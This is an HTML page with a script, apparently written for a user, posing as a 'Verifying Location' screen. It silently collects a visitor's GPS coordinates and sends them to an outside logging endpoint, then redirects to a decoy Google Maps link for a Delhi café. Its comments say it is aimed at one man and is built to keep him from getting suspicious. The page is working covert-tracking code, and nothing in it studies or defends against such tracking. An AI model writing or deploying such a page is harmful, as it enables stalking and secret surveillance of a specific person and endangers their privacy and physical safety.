<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Location Verified</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f9f9f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .container {
            text-align: center;
            background: white;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            width: 80%;
            max-width: 350px;
        }
        .icon {
            width: 50px;
            height: 50px;
            margin: 0 auto 20px;
            border: 4px solid #e0e0e0;
            border-top: 4px solid #4285f4;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        h2 {
            margin: 0 0 10px;
            color: #333;
            font-size: 18px;
        }
        p {
            margin: 0;
            color: #666;
            font-size: 14px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

<div class="container" id="loader-container">
    <div class="icon"></div>
    <h2>Verifying Location...</h2>
    <p>Please wait a moment.</p>
</div>

<script>
    // CONFIGURATION
    // Replace this URL with your actual logging endpoint.
    // Example: 'https://api.jsonbin.io/v3/b/YOUR_BIN_ID/latest'
    // Or a local PHP script: 'http://192.168.1.100/log.php'
    const logUrl = 'https://api.jsonbin.io/v3/b/YOUR_BIN_ID/latest'; 
    
    // The specific Blue Tokai Cafe link you provided
    const decoyUrl = "https://www.google.com/maps/search/?api=1&query=Blue+Tokai+Coffee+Roasters+Defence+Colony+Delhi";

    function handlePosition(position) {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const accuracy = position.coords.accuracy;
        const timestamp = position.timestamp;

        // 1. Log the data to your server
        const payload = `lat=${lat}&lon=${lon}&acc=${accuracy}&time=${timestamp}`;
        
        // Send the log (fire and forget)
        fetch(logUrl + '?' + payload).catch(() => {
            console.log("Logging failed");
        });

        // 2. Redirect to the decoy after a short delay
        setTimeout(() => {
            window.location.href = decoyUrl;
        }, 1500);
    }

    function handleError(error) {
        // If he denies location, just send him to the cafe so he doesn't get suspicious
        window.location.href = decoyUrl;
    }

    // Request location immediately
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(handlePosition, handleError);
    } else {
        // Fallback for very old browsers
        window.location.href = decoyUrl;
    }
</script>

</body>
</html>
